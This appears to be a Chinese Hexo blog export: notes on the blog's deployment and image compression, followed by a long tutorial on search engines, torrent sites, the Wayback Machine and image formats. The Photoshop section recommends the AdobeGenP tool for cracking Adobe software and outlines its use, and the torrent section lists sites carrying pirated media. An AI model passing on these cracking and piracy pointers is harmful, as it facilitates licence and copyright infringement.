<h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>和我想的不一样，网页的部署是Hexo自动完成的，生成的网页和源码完全是两回事，所以还需要新开一个仓库来保存源码。但是感觉好麻烦，每次都要执行好几次命令，而且我node_module放在项目文件夹里的，git扫描要挺久的。后续想尝试下用Action，push源码后自动运行Hexo生成网页。</p>
<h3 id="Github-Action-自动布署-Hexo"><a href="#Github-Action-自动布署-Hexo" class="headerlink" title="Github Action 自动布署 Hexo"></a>Github Action 自动布署 Hexo</h3><p>参考了这篇文章：<a class="link"   href="https://zhuanlan.zhihu.com/p/170563000" >https://zhuanlan.zhihu.com/p/170563000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>简单说一下结构。我上传的源码中包含NodeModule和Hexo文件，所以在Action中直接用命令行调用即可。Hexo依赖Git来推送布署网站，所以要生成一对密钥给Git用。当我push源码到仓库时，workflow被触发，在云端Action上clone我的网站源码并执行Hexo，这样就能更新我的网站了。</p>
<p>还有个坑没搞明白，Action上运行Hexo布署网站后，仓库的git log只剩两条了，而我在本地布署并不会这样，<del>猜测和clone --depth&#x3D;1有关</del>(没有关系)。</p>
<h3 id="Aplayer"><a href="#Aplayer" class="headerlink" title="Aplayer"></a>Aplayer</h3><p>网页左下角的音乐播放器是Aplayer实现的，参考了这篇文章<a class="link"   href="https://blog.csdn.net/weixin_58068682/article/details/116612364" >https://blog.csdn.net/weixin_58068682&#x2F;article&#x2F;details&#x2F;116612364 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这篇文章中使用的Hexo主题是Butterfly，和我的并不一样。不过我的主题也支持pjax，应该是能实现全局音乐播放的，最后折腾了一番才把我的整好。</p>
<p>遇到一个坑：Aplayer的&lt;div&gt;代码一开始是放footer的，但一切换页面左下角播放器就消失了，音乐倒是还在放。然后思考了一下决定把代码放body里，于是修改layout.ejs，成功。</p>
<h3 id="Jpegoptim"><a href="#Jpegoptim" class="headerlink" title="Jpegoptim"></a>Jpegoptim</h3><p>因为博客采用Github Page，所以访问速度有够慢的，live2D经常加载不出来(倒是和Page无关)。考虑到后期上的图可能比较多，不可能每次都手动压缩，我设置了jpg压缩程序，使用的是Jpegoptim，配合find就能实现批量操作。另外，每次加图片都要跑到主题module文件夹里去，因为生成网页源码就从那个地方加载，不知道怎么调，干脆就写了个shell命令从外面文件夹复制图片进去，这样加图片会比较方便。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">find ./public/images/post_imgs/ -not -iname &quot;*_raw.jpg&quot; -not -iname &quot;*_raw.jpeg&quot; -iname &quot;*.jpg&quot; -o -iname &quot;*.jpeg&quot; | xargs jpegoptim -m 80</span><br></pre></td></tr></table></figure></div>

<p>上述代码为设置jpg质量为80，jpegoptim会默认跳过一些不需要优化压缩的图片。另外这个优化并不是对原图片进行修改，而是对hexo g之后生成的public文件夹中图片进行修改，原图能得到比较妥善的保管。文件名最后带有_raw的jpg&#x2F;jpeg图片不会被压缩。</p>
<p>后续待更新</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机通用技能进阶扫盲</title>
    <url>/2024/09/04/general-skills/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>最近决定把自己会的计算机操作技巧记录下来，如果文章中有任何错误，请告知我。</p>
<p><strong>本文章是一个知识集合，我会持续扩充本文章的内容，所以本文章会变得越来越长</strong></p>
<p><strong>若读者只想要了解某一方面的知识点，请善用目录和搜索功能！</strong></p>
<p><strong>目录功能需要在 PC 端使用</strong></p>
<h1 id="本文章正在施工中"><a href="#本文章正在施工中" class="headerlink" title="本文章正在施工中"></a>本文章正在施工中</h1><p>~2024.10.23</p>
<h1 id="搜索引擎篇"><a href="#搜索引擎篇" class="headerlink" title="搜索引擎篇"></a>搜索引擎篇</h1><p>要想学习一个新事物，首先得搞明白它到底是什么东西，是干什么的。对于计算机使用者，学会使用搜索引擎是非常重要的，与其在群里问东问西，不如自己上网搜索解决。</p>
<h2 id="各大搜索引擎简介"><a href="#各大搜索引擎简介" class="headerlink" title="各大搜索引擎简介"></a>各大搜索引擎简介</h2><ol>
<li><p><strong>Baidu</strong><br>  对于国内来说，搜索引擎做得最大的是 <a class="link"   href="https://www.baidu.com/" >百度 www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，但是百度的搜索内容质量一言难尽，懂的都懂，在搜索技术性问题时，不推荐使用百度。此外百度有个功能叫 <a class="link"   href="https://xueshu.baidu.com/" >百度学术 xueshu.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，专门用来搜索国内外学术文章的，但是笔者也未曾使用过，其搜索质量未知。</p>
</li>
<li><p><strong>Bing</strong><br><a class="link"   href="https://www.bing.com/" >必应 www.bing.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是微软旗下的一款搜索引擎，可以在国内使用，搜索内容质量中上。需要注意的是必应为了进入中国市场而区分了 <a class="link"   href="https://cn.bing.com/" >国内版 cn.bing.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和国际版，在国内访问会被强制跳转到国内版，国内版缺少了一些功能，比如 Copilot AI，此外国内版还有一些广告，但是和百度的一比都不值一提了。即使有这个区分，国内版的搜索质量也非常之高，笔者一直使用必应作为默认搜索引擎。但必应国内版其实出现过多次宕机的情况，还有好几次针对其的 DNS 污染&#x2F;劫持攻击，不过这种事情都是小概率事件，遇到了可以先用其他的搜索引擎代替。</p>
</li>
<li><p><strong>Google</strong><br><a class="link"   href="https://www.google.com/" >谷歌 www.google.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 可以算是搜索引擎的开山鼻祖，是其他各大搜索引擎一座不可逾越的大山。谷歌的搜索质量非常高，并且可以搜索到国内外各种内容 (主要是国外)。缺点是国内无法直接访问，但是作为一个计算机相关专业从业人员，必须学会使用谷歌搜索引擎。</p>
</li>
</ol>
<p>除此之外还有一些搜索引擎就不再列出，本文只是一个引导作用，如果有想深入了解的内容可以自行搜索。</p>
<h3 id="文字搜索引擎使用技能"><a href="#文字搜索引擎使用技能" class="headerlink" title="文字搜索引擎使用技能"></a>文字搜索引擎使用技能</h3><p>使用搜索引擎是有技巧的，平常直接输入文字只是其最简单的操作，下面介绍一些常用技巧</p>
<ol>
<li><p><code>&quot;双引号&quot;</code><br>双引号内的字符表示完全匹配，比如搜索时输入 <code>&quot;CTF&quot;</code>，则会返回完全匹配该字符的页面。使用场景：有时输入一长串文字，搜索引擎可能会将其分开搜索，若有完全匹配的需求则可以使用</p>
</li>
<li><p><code>- 排除</code><br>符号 <code>-</code> 的作用是排除存在某关键字的网页，使用方式如：<code>&quot;CTF&quot; -web</code>，这样搜出来的页面就没有 <code>web</code> 这个关键字</p>
</li>
<li><p><code>site:example.com</code> 站内搜索<br>表示匹配某个域名下网站的搜索结果</p>
</li>
</ol>
<p>以上技巧以及一些未列出的技巧都可以在 Google 的高级搜索中找到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/advantage_search.png.avif"
                      alt="高级搜索"
                ></p>
<h2 id="图片搜索引擎"><a href="#图片搜索引擎" class="headerlink" title="图片搜索引擎"></a>图片搜索引擎</h2><p>上面介绍了文字搜索，现在介绍图片搜索。图片搜索大致可以分为<strong>以图搜图</strong>(找原图，溯源)、<strong>图像识别</strong>(AI识物、地点等)</p>
<ol>
<li><p>百度识图<br>说到图片搜索，百度还是有一席之地的，使用其搜索国内互联网图片、地点照片等是非常好用的，但是搜索国外的图片、绘画就拉了。使用方式：在电脑端百度主页搜索框右侧有个照片图标，点击即可上传图片。</p>
</li>
<li><p>Google 识图<br>谷歌作为世界上最大的搜索引擎，其图像匹配功能也非常强大，常用于图片溯源。靠低分辨率图片找原图出处，用残缺的图片或被传播过程中抹除部分的图片搜索到完整图片，谷歌都可以做到。如果一张图连谷歌都搜不到，那基本就很难确定其来源了。</p>
</li>
<li><p>二次元图片搜索<br>Q 群中经常有非常多的二次元插画图片，这些图片大多来自国外二次元插画网站 Pixiv，少部分来自 Twitter。由于 Twitter 是开放性社交媒体，上面的图片用谷歌就可以搜到，而 Pixiv 的插画非常多，有些是谷歌搜不到的。遇到这种情况就可以使用以下网站：</p>
<ul>
<li><a class="link"   href="https://ascii2d.net/" >二次元画像詳細検索 ascii2d.net <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://saucenao.com/" >SauceNAO saucenao.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://iqdb.org/" >Multi-service image search iqdb.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://trace.moe/" >Anime Scene Search Engine trace.moe <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (以图搜番)</li>
</ul>
<p> 这些网站专门用于搜索上述情况的图片，即使是图片被删了，只要在它数据库里，也能搜到图片被删之前的来源。</p>
</li>
</ol>
<p>还有一些网站可能未列出，读者可自行探索。</p>
<h2 id="Bittorrent-搜索引擎"><a href="#Bittorrent-搜索引擎" class="headerlink" title="Bittorrent 搜索引擎"></a>Bittorrent 搜索引擎</h2><p>BT 的时代几乎已经过去，但很多使用场景仍然只有它能胜任，比如日漫 RAW 源发布、字幕组翻译作品发布，几乎所有在线看动漫的网站的资源源头都来自 BT 站。就综合情况来看，BT 几乎是性价比最高的资源发布方式，只需要一串唯一的磁力 Hash 就能进行下载，其去中心化的设计也使其脱离了监管，妥妥的网络小灰色地带。</p>
<p>本节主要介绍搜索引擎，关于 BT 技术不过多深入。</p>
<h3 id="中文区"><a href="#中文区" class="headerlink" title="中文区"></a>中文区</h3><p>中文区有好几个专门发布翻译前&#x2F;后动漫源的 BT 站点，这几个站点好像是互相扒资源，又或者是都去扒的最上层某网站的资源，我并不清楚，总之他们的资源列表几乎一致。他们分别是：</p>
<ul>
<li><p><a class="link"   href="http://share.dmhy.org/" >动漫花园 share.dmhy.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>疑似中文区最老那一批 BT 网站，我懒得考据了。</p>
</li>
<li><p><a class="link"   href="https://www.miobt.com/" >MioBT www.miobt.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 等镜像站<br>国内 BT 发布网站，他们搞了个联盟，导致有长得几乎一模一样的镜像站，主站进去有个人机校验，所以我平时喜欢用镜像站 <a class="link"   href="https://comicat.org/" >漫猫 comicat.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/comicat.png.avif"
                      alt="漫猫"
                ></p>
<p>不仅是动漫，国内还有很多爱好者喜欢去 PT 站点下载各种资源，尤其是电影原盘爱好者。但是本文章不会介绍任何 PT 站点，下面介绍一些电影相关站点。</p>
<ul>
<li>音范丝<br> <a class="link"   href="https://www.yinfans.me/" >音范丝 www.yinfans.me <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，一个专门发布电影 BT 资源的站点，有着极其丰富的 BT 资源。</li>
</ul>
<p>内容待补充</p>
<h3 id="国际区"><a href="#国际区" class="headerlink" title="国际区"></a>国际区</h3><ul>
<li><p>Nyaa<br> <a class="link"   href="https://nyaa.si/" >Nyaa.si <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是国外很出名的动漫 BT 下载站，日漫 RAW 源几乎都能在上面找到，不仅如此还有各国字幕组在上面发布资源。</p>
</li>
<li><p>YTS<br> <a class="link"   href="https://yts.mx/" >YTS.mx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是国外很出名的电影 BT 下载站点，电影资源非常丰富，各国的电影在上面都能找到。</p>
</li>
<li><p>東京図書館<br> <a class="link"   href="https://www.tokyotosho.info/" >东京图书馆 www.tokyotosho.info <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 正如其名字，是专门收集发布日本媒体资源的 BT 站点。其内容包括日漫 RAW 源、同人志、DLSite 内容、无损音乐和 MV，以及其他很多不可描述的东西，总之它也算个搜索引擎就写上来了 (</p>
</li>
</ul>
<h2 id="互联网档案馆-archive-org"><a href="#互联网档案馆-archive-org" class="headerlink" title="互联网档案馆 archive.org"></a>互联网档案馆 archive.org</h2><p><a class="link"   href="https://archive.org/" >互联网档案馆 archive.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一个互联网存档项目，该网站收集了众多互联网产物，其中最多的是它的 <a class="link"   href="https://web.archive.org/" >Web 档案馆 web.archive.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，俗称 Wayback Machine，该分类收集了数量难以想象的网页快照，这使得它成为了互联网历史溯源的一个重要工具。</p>
<p>如下图，在输入框中输入域名 <code>mikufans.cn</code> (B 站早期) 即可搜索到诸多快照点，其中有 2009 年的快照。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/wayback_searchExample.png.avif"
                      alt="Search"
                ></p>
<p>点开最早时间为 July 14, 2009 20:20:42 的快照，就能看到早期 B 站的网页大致内容。由于当时 B 站不允许抓取 CSS 样式表，所以快照的排版效果不太好，但是依旧能看到视频标题等诸多内容。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/wayback_mikufans.png.avif"
                      alt="mikufans.cn"
                ></p>
<p>虽然上述例子中快照没有图片，但实际上是会抓取图片的，将域名换成 <code>bilibili.us</code> 重新找一个快照：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/wayback_bilibili.jpg.avif"
                      alt="bilibili.us"
                ></p>
<p>虽然能保存图片快照，但并不是所有图片都可以，有些图片会失效，可能是外链导致的。</p>
<h1 id="媒体篇"><a href="#媒体篇" class="headerlink" title="媒体篇"></a>媒体篇</h1><p>本篇的“媒体”表示图片、视频、音乐等网络信息传播文件形式，了解了这些媒体文件的本质就能更好地处理相关问题。</p>
<p>摄影常识将在视频小节后介绍。</p>
<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>要了解一张图片，可以从这几点入手：像素、分辨率、格式。</p>
<h3 id="像素"><a href="#像素" class="headerlink" title="像素"></a>像素</h3><p>像素 (Pixel) 是图片的最小单元，一个像素就是一个颜色点，很多个像素拼在一起就组成了图片。一般来说图片的宽高都以像素为单位，比如一台显示器的分辨率是 <code>1920x1080</code>，就表示宽 <code>1920</code> 像素，高 <code>1080</code> 像素，截个全屏图就是 <code>1920x1080</code> 像素的图片。</p>
<p>像素的颜色这里只讲 RGB(RED GREEN BLUE)，即红绿蓝三原色，每个像素点都是由这三种颜色的不同比例组成的，一般用一个字节(即数字<code>0~255</code>)表示一个三原色的量，比如红色 <code>255</code>，绿色 <code>0</code>，蓝色 <code>0</code>，就是红色，全 <code>255</code> 就是白色。</p>
<p>在 Web 页面等开发中经常使用十六进制表示 RGB 颜色，比如红色就是 <code>#FF0000</code>。这里额外补充一下像素的透明度实现，即 Alpha 通道，合称 RGBA，用十六进制表示就是 <code>#39C5BBFF</code>，<code>FF</code> 表示不透明，<code>00</code> 表示完全透明。</p>
<h4 id="DPI"><a href="#DPI" class="headerlink" title="DPI"></a>DPI</h4><p>与像素有关的概念还有 DPI (Dots Per Inch)，即每英寸的像素数，这个概念不太好用文字描述，可以去 B 站搜视频看，主要是代表了计算机图片对应到现实的尺寸应该有多大。DPI 一般在打印时会涉及到，DPI 越高，代表在物理层相同尺寸的一处二维空间上能容纳的像素越多，图片也就越清晰。</p>
<p>一张图片像素不变，DPI 设置得越大，打印出来尺寸就越小。</p>
<h4 id="位深度"><a href="#位深度" class="headerlink" title="位深度"></a>位深度</h4><p>位深度这个概念可能大多数人就没有了解过了。最直观的理解就是，图片的位深度越大，它所能显示的色彩范围就越广。</p>
<p>位深度就是指一个像素用了多少位二进制来进行表示，具体的规定如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/color_depth.png.avif"
                      alt="位深度"
                ></p>
<p>比如一张没有透明像素的 PNG 图片可以以 24 位深度进行编码保存，若给它增加了透明像素 (增加 Alpha 通道)，它就必须以 32 位深度进行保存。</p>
<h3 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h3><p>当我们日常谈论一张图片文件的分辨率 (Image Resolution)，实际上是在谈论它的尺寸，也就是像素宽高。除此之外这个概念好像没啥好说的了。</p>
<h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>在我们访问 Web 页面时会看到非常多的图像，假设一个网页上有一个图片，其大小为 <code>1MB</code>，那么每当有一个人访问该网页，服务器就会向用户发送 <code>1MB</code> 的图片数据。</p>
<p>我举这个例子只是想说，如果存储一张图片是把每个像素点的 RGB 值很直接地存储下来的话，效率实在是太低了。这张 <code>1MB</code> 的图片哪怕体积减小 <code>10%</code>，累计下来也能节省不少带宽。</p>
<p>读者可以在自己电脑上随便点一张图看下属性，算出其像素数量，再用其位深度除以 <code>8</code> 算出每个像素需要多少字节数据来表示，最后乘起来看看结果和其实际体积相比如何。你会发现现在流行的图片格式无一例外体积都一定远远小于你算出来的数字，这说明很多图片格式并不是直接存储像素的，而是经过了算法的优化。</p>
<h4 id="JPEG"><a href="#JPEG" class="headerlink" title="JPEG"></a>JPEG</h4><p>JPEG 格式是一种流行的有损压缩图片格式，其文件后缀为 <code>.jpg</code> 或 <code>.jpeg</code>。对于大多数图片，JPEG 都能有效地减少其体积，而人的肉眼几乎看不出太多变化 (视压缩程度而定)。</p>
<p>比如我博客的夜间模式首页图，分辨率也不算很小，但是其体积仅为 <code>33KB</code>，这就是 JPEG 压缩的强大之处。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/girl_dark_raw.jpg"
                      alt="girl_dark"
                ></p>
<p>JPEG 拥有四种压缩模式，本文稍微提一下前两种，分别是 <strong>基于DCT的连续模式 Baseline JPEG</strong> 与 <strong>基于DCT的渐进式模式 Progressive JPEG</strong>。</p>
<ul>
<li><p>连续模式 Baseline JPEG<br> 这种模式是基本 JPEG 压缩模式，一次将图像由从左到右、由上到下进行处理，大部分软件保存 JPEG 默认都是这个模式。要直观地体验这个模式，可以在新标签页打开<a class="link"   href="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/girl_dark_raw.jpg" >上面那张图片 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，再打开浏览器 F12 找到 Network 网络选项，选择模拟 3G 网络，勾选禁用缓存，然后刷新页面，注意观察图像的渲染状态。</p>
</li>
<li><p>渐进式模式 Progressive JPEG<br> 这种 JPEG 平常见得比较少，它在加载时可以先加载出一个大致的预览图，然后再慢慢变清晰，在网络传输较慢的场景可以为用户提供图像大致预览。</p>
<p> 我以前有个索尼的卡片式相机拍摄的照片就是这种 JPEG，因为相机的储存卡读取速度有限，浏览相册时并不能快速地加载整个图像，而这种渐进式 JPEG 又很适合快速翻阅照片预览的情况，若是使用普通 JPEG，从上到下加载的图片根本就没办法快速翻阅预览。</p>
<p> <a class="link"   href="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/jpeg_prog_example_raw.jpg" >这张图片 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是一个渐进式 JPEG，读者可以用上述方法感受一下加载过程。</p>
</li>
</ul>
<p>JPEG 的唯一缺点就是，它是有损压缩，正因如此，它是不支持透明像素 (Alpha 通道) 的，并且压缩程度过大就会产生明显的色块。放大我博客的夜间模式首页图可以发现，实际上它是很模糊的，有很多方形的色块。</p>
<h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>PNG 格式是一种常用的无损压缩格式，它能 <code>100%</code> 还原出原始图片，同时也能减小文件体积。它支持 32 位深度，也就是支持透明像素，现在大部分带透明像素的图片都是这种格式。</p>
<p>对于细节比较统一的图片，比如随便截个白底黑字图，PNG 的图片体积也能压缩到很小，而如果用 PNG 去保存上面那张博客首页图，那么体积就会比 JPEG 大得多。这是因为 PNG 使用了 ZIP 格式压缩同款算法 Deflate 来压缩像素，这种算法使用字典来实现压缩，它将多次出现的同款长数据加入到字典中，然后就可以用标记来代替原数据了，像白底黑字图片中这种连续的白色像素非常多所以压缩效果比较好，而对于颜色细节都十分丰富的图片，这种算法节省的体积就十分有限了。</p>
<h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>一种常用的动图格式，和 JPEG 一样都是表情包的专用格式。GIF 实现动图的原理就是让很多张图片进行快速切换，达到一定速度人脑就会认为是连续的动态画面了。值得一提的是，GIF 支持 1 bit Alpha 通道，也就是支持全透明&#x2F;不透明像素，经过处理的表情包看起来很有意思。</p>
<p>由于 GIF 格式年代久远，其设计时采用了 8 位深度，也就是 256 色，所以其显示效果是很有限的。</p>
<h4 id="Webp"><a href="#Webp" class="headerlink" title="Webp"></a>Webp</h4><p>一种静态&#x2F;动态图片格式，由谷歌公司开发，使用 VP8 (谷歌的视频编码器，YouTube 专用，后面会介绍) 同款编码器算法对图片进行有损&#x2F;无损压缩。</p>
<p>正如其名字，它是专门设计用于 Web 浏览器上的网络图像格式，拥有高压缩比，且显示效果优于 JPEG，它可以在 Web 上完全代替所有图片格式。</p>
<p>下面是一张无损动态 Webp 图片，体积仅为 <code>842KB</code>，而 GIF 要做到同等效果至少需要 <code>1.2MB</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/webp_example.webp"
                      alt="Webp example"
                ></p>
<h4 id="AVIF"><a href="#AVIF" class="headerlink" title="AVIF"></a>AVIF</h4><p>谷歌公司开发的最新图片格式，基于 AV1 编码器，而 AV1 是由 VP9 改进而来，该格式支持静态&#x2F;动态图片，并且还支持 HDR 功能。</p>
<p>这是一个非常恐怖的格式，它不仅继承了 Webp 的优点，还比它更强。请看如下动图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/avif_example.avif"
                      alt="Avif example"
                ></p>
<p>这是一个仅为 127KB 的有损 avif 动图，但是就画面上来看，它和上面的无损 Webp 完全一致。</p>
<p>该图片由我使用 FFmpeg 默认模式创建，若使用默认模式 (质量 75) 创建同款<strong>有损</strong> Webp 动图，大小约为 700KB，并且画面出现明显色块：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/webp_lossy_example.webp"
                      alt="Webp lossy exmaple"
                ></p>
<p>若要说该格式有什么缺点，那就是它的兼容性较差、编解码开销较大。</p>
<p>兼容性差是因为还没有推广开，软件适配得少，不过目前 Chrome 已经支持这种格式，并且其为开源，适配应当很容易。</p>
<p>而编解码问题是 AV1 的一大痛点，AV1 为了实现优秀的压缩性能使用了非常复杂的算法，编码过程非常非常慢。解码过程还好，但是与其他格式相比之下也消耗更多客户端计算资源并增加耗电，这对于移动端可能是一个问题。</p>
<p>若想了解该格式的更多内容，可以访问这位哥的博客：<a class="link"   href="https://blog.hentioe.dev/posts/getting-started-with-avif-format.html" >https://blog.hentioe.dev/posts/getting-started-with-avif-format.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h4><p>SVG 是一种矢量格式，和传统图片位图不同，它不是保存像素，而是靠代码来实现绘制线条路径等，所以它不像普通图片那样放大就变糊，因为它是实时绘制的。既然它是实时绘制并且依靠代码，那么完全可以将它设计成支持动态变换——事实上也确实如此。SVG 和 Web 离不开关系，它可以和 Web 控件互动，实现精美的网页效果。</p>
<p>下面是我用工具乱画的一个 SVG 矢量图以及网上找的一个动态 SVG 图，在 F12 中打开源文件可以看到路径代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/svg_example.svg"
                      alt="SVG example"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/svg_animated_exmaple.svg"
                      alt="SVG animation exmaple"
                ></p>
<h4 id="BMP"><a href="#BMP" class="headerlink" title="BMP"></a>BMP</h4><p>BMP 是由微软开发的一种图像格式，广泛应用于 Windows 系统中，支持 8~32 位色，几乎不压缩数据，也因此它的体积往往远大于其他格式。读者可以找张 BMP 图片用我本小节开头说的那个方法计算一下该图所有像素需要的字节表示量，你会发现结果差不多和 BMP 图片体积一样大。</p>
<h3 id="图像元数据-Exif"><a href="#图像元数据-Exif" class="headerlink" title="图像元数据 - Exif"></a>图像元数据 - Exif</h3><p>元数据 (Metadata) 是描述数据的数据，图片元数据是嵌入到图片文件中的一些信息，而 Exif 是相机记录拍摄日志的一种元数据。</p>
<p>Exif 可以记录相机 (手机) 型号、光圈、快门时长、图片尺寸、拍摄日期、焦距、ISO (感光度)、拍摄地 GPS 坐标。</p>
<p>现在的手机照相也会自动记录上述 Exif 信息，所以说千万不要在网络上上传手机拍摄的原图，否则可能直接被人通过 Exif 记录的 GPS 坐标定位。</p>
<h3 id="图像处理工具"><a href="#图像处理工具" class="headerlink" title="图像处理工具"></a>图像处理工具</h3><p>日常生活中经常会有处理图片、照片的需求，下面会介绍一些常用软件。</p>
<h4 id="Adobe-PhotoShop"><a href="#Adobe-PhotoShop" class="headerlink" title="Adobe PhotoShop"></a>Adobe PhotoShop</h4><p>没错就是大名鼎鼎的 PS，图像处理界霸主地位，几乎无可替代，有大神甚至用它画画，用过的都说好。</p>
<p>本文章是一个介绍性文章，不可能把 PS 的用法全部写下来，教程 B 站一抓一大把。本节只介绍一下现在常用的 Adobe 软件破解方式。</p>
<h5 id="AdobeGenP"><a href="#AdobeGenP" class="headerlink" title="AdobeGenP"></a>AdobeGenP</h5><p><a class="link"   href="https://github.com/wangzhenjjcn/AdobeGenp" >AdobeGenP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是目前主流的 Adobe 软件破解方式，它通过 patch Adobe Creative Cloud (相当于 Adobe 的应用商店兼软件包管理器，后简称 Adobe CC) 来实现破解。用户需要先安装 Adobe CC，然后从中安装自己需要的 Adobe 软件比如 PS、Ae、Pr，随后使用 GenP 进行破解即可。</p>
<h4 id="ScreenToGif"><a href="#ScreenToGif" class="headerlink" title="ScreenToGif"></a>ScreenToGif</h4><p><a class="link"   href="https://www.screentogif.com/" >ScreenToGif <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是一个开源免费软件，正如其名字，它是专门用于编辑创建 GIF 图片的。它可以直接框选屏幕进行 GIF 录制，也可以编辑已有的 GIF 图片，还可以直接导入多张图片制作成 GIF。</p>
<p>它支持对帧进行处理，包括尺寸调整、帧延时 (每帧停留时间)、重复帧分析 (移除重复帧可以有效减少体积)、打码、文字、进度条、自由绘制</p>
<p>它提供了多种编码器，能够调整 GIF 颜色，控制质量和体积，还能编码保存 Webp、APNG 等动图格式，总的来说是一个不错的软件，下图为用其制作的一张 GIF 动图。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://testingcf.jsdelivr.net/gh/hexrotor/hexrotor.github.io/images/post_imgs/skills_img/gif_example_raw.gif"
                      alt="GIF example"
                ></p>
<h4 id="Microsoft-Windows-Paint-Windows-画图"><a href="#Microsoft-Windows-Paint-Windows-画图" class="headerlink" title="Microsoft Windows Paint (Windows 画图)"></a>Microsoft Windows Paint (Windows 画图)</h4><p>不要小看画图，在众多图像软件中它绝对能有一席之地。</p>
<p>首先它是 Windows 自带软件，不需要安装，点击即用；其次它简单易用，就是一个画板功能，同时也有内置图形模板 + 区域选择剪切功能，平时想给图片打个码或者写点文字直接用它方便又快捷。而且它也支持调整图片大小 + 存储格式，Windows 11 上最新的版本还新增了图层功能。有些网站限制图片尺寸和体积，比如 B 站上传封面强制要求图片尺寸大于多少我忘了，以及很常见的图片上传体积限制，都可以直接用它搞定。有些 PNG 图片另存为 JPEG 就可以缩小体积，或者调整图片尺寸也能有效缩小体积。</p>
<p>缺点：不支持透明像素、JPEG 压缩有点过分。带透明像素的 PNG 图片经过它处理后透明像素就没有了，会变成白色；PNG 的图片用它另存为 JPEG 后会有点糊，压缩调得比较狠。</p>
<h4 id="Webp-tools"><a href="#Webp-tools" class="headerlink" title="Webp tools"></a>Webp tools</h4><p>此工具为 Linux 命令行工具，可以显示、创建静态 Webp 图片，使用 <code>sudo apt install webp</code> 即可安装。</p>
<details>

<summary>其中 cwebp 工具用于创建图片 (点击展开)</summary>

